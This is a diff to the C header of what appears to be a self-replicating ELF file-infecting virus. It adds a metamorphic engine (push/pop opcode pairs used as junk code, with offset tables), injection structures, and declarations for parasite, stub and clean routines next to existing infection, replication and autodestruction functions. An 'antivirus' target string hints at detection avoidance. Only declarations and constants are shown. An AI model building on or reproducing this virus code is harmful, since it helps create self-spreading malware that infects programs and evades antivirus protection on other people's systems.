@@ -34,16 +34,44 @@
 
 #define BUFF_SIZE 0x2000
 #define JUMP_SIZE 0x4
-#define STUB_SIZE 0x16e
+#define STUB_SIZE 0x182
 #define PAGE_SIZE 0x1000
 #define FCNT_SIZE 0x7
+#define OFFS_SIZE 0xa
+#define CODE_SIZE 0x8
 
-#define ADDR_OFFSET 0x4f
-#define SIZE_OFFSET 0x54
+#define ADDR_OFFSET 0x53
+#define SIZE_OFFSET 0x58
 
 #define TARGET "antivirus"
 
 #define DEFAULT_KEY_SIZE 0x8
+
+#define OFFSET_1 0x19
+#define OFFSET_2 0x49
+#define OFFSET_3 0x6a
+#define OFFSET_4 0x96
+#define OFFSET_5 0xb4
+#define OFFSET_6 0xd5
+#define OFFSET_7 0xf9
+#define OFFSET_8 0x129
+#define OFFSET_9 0x15f
+#define OFFSET_A 0x17b
+
+#define RAX 0x5850
+#define RDI 0x5f57
+#define RSI 0x5e56
+#define RDX 0x5a52
+#define RCX 0x5951
+
+#define RBP 0x5d55
+#define RSP 0x5c54
+#define RBX 0x5b53
+#define RAX 0x5850
+#define RDI 0x5f57
+#define RSI 0x5e56
+#define RDX 0x5a52
+#define RCX 0x5951
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
@@ -116,6 +144,19 @@ struct s_keychain
 	size_t junk[KEY_SIZE][KEY_SIZE];
 };
 
+struct s_metamorph
+{
+	unsigned short code[CODE_SIZE];
+	unsigned int offset[OFFS_SIZE];
+};
+
+struct s_injection
+{
+	char *ptr;
+	int fd;
+	size_t filesize;
+};
+
 ////////////////////////////////////////////////////////////////////////////////
 /// DECLARATIONS 
 ////////////////////////////////////////////////////////////////////////////////
@@ -136,6 +177,9 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
+void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
+void clean(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context);
